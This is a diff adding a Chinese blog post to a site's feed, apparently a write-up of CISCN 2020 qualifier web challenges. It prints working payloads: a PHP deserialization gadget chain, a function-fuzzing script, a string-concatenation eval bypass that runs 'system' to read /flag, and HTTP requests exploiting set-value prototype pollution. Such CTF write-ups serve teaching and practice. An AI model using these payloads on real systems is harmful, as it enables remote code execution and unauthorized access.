@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>ciscn2020预选赛</title>
+      <link href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/"/>
+      <url>/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/</url>
+      
+        <content type="html"><![CDATA[<h1 id="ciscn-2020-预选赛"><a href="#ciscn-2020-预选赛" class="headerlink" title="ciscn 2020 预选赛"></a>ciscn 2020 预选赛</h1><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>和wmctf2020的webwebpayload相同</p><pre><code class="php">&lt;?phpnamespace DB{    abstract class Cursor  implements \IteratorAggregate {}}namespace DB\SQL{    class Mapper extends \DB\Cursor{        protected            $props=[&quot;quotekey&quot;=&gt;&quot;phpinfo&quot;],            $adhoc=[-1=&gt;[&quot;expr&quot;=&gt;&quot;&quot;]],            $db;        function offsetExists($offset){}        function offsetGet($offset){}        function offsetSet($offset, $value){}        function offsetUnset($offset){}        function getIterator(){}        function __construct($val){            $this-&gt;db = $val;        }    }}namespace CLI{    class Agent {        protected            $server=&quot;&quot;;        public $events;        public function __construct(){            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \DB\SQL\Mapper(new \DB\SQL\Mapper(&quot;&quot;)),&quot;find&quot;)];            $this-&gt;server=&amp;$this;        }    };    class WS{}}namespace {    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));}</code></pre><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p><p>fork子进程执行的代码是：</p><pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre><p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p><pre><code class="php">&lt;?php    $payloads=[        &quot;ls&quot;,//shell命令执行测试        &quot;index.php&quot;,//读取文件测试        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试        &quot;echo 123;&quot;//php命令执行测试    ];    $str=file_get_contents(&quot;fatalerr.log&quot;);    if(!$str){        $str=&quot;[]&quot;;    }    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);    function show_result($func,$r,$v){        if($r==NULL){        }        try{            echo &quot;$func($v,false,true) return value:&quot;;            var_dump($r);            echo &quot;&lt;br /&gt;&quot;;        }catch(Exception $e){}    }    function brute_func($a){        global $payloads;        global $fatalerror;        foreach($a as $val){            if(is_array($val)){                brute_func($val);                continue;            }            if(in_array($val,$fatalerror)){                continue;            }            array_push($fatalerror,$val);            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));            foreach($payloads as $v){                $r=NULL;                $r=call_user_func_array($val,[$v,false,true]);                show_result($val,$r,$v);            }            array_pop($fatalerror);        }    };    $arr=get_defined_functions();    brute_func($arr);?&gt;</code></pre><p>多次执行发现：</p><pre><code class="php">stream_socket_serverexecstream_socket_client</code></pre><p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码</p><p>但是这里只需要segment_fault,所以访问<code>?a=stream_socket_server&amp;b=</code>拿到flag</p><h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>注意到有个eval只要绕过限制就可以执行命令了</p><p>很简单利用字符串拼接绕过</p><p><code>{if:+(&#39;base64_deco&#39;.&#39;d&#39;.&#39;e&#39;)(&#39;c3lzdGVt&#39;)(&#39;cat+/flag&#39;)}{end+if}</code></p><h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>队里的师傅做出来的,dbq，我太菜了</p><pre><code class="php">&lt;?phpclass trick{    public $trick1;    public $trick2;}$t = new trick;$t-&gt;trick1 = &quot;INF&quot;;$t-&gt;trick2 = 1e1111;echo serialize($t);</code></pre><h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><pre><code>λ npm audit                       === npm audit security report ===# Run  npm update set-value --depth 1  to resolve 1 vulnerability  High            Prototype Pollution  Package         set-value  Dependency of   set-value  Path            set-value  More info       https://npmjs.com/advisories/1012found 1 high severity vulnerability in 61 scanned packages  run `npm audit fix` to fix 1 of them.</code></pre><p>原型链污染，poc地址：<br><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p><ul><li>先访问一次<code>/SpawnPoint</code>，拿个sessionid</li><li>然后访问<code>/Privilege</code>污染原型链（用<code>constructor.prototype</code>或者<code>__proto__</code>均可）</li><li>最后访问<code>/DeveloperControlPanel</code>拿flag</li></ul><pre><code>POST /Privilege HTTP/1.1Host: hostContent-Type: application/x-www-form-urlencodedCookie: session=yoursessionNewAttributeValue=abc&amp;NewAttributeKey=__proto__.password4POST /DeveloperControlPanel HTTP/1.1Host: hostContent-Type: application/x-www-form-urlencodedCookie: session=yoursessionkey=password4&amp;password=abc</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/08/21/ciscn2020预选赛/">http://blog.ccreater.top/2020/08/21/ciscn2020预选赛/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 比赛 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ciscn2020easyphp出题笔记</title>
       <link href="/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
       <url>/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
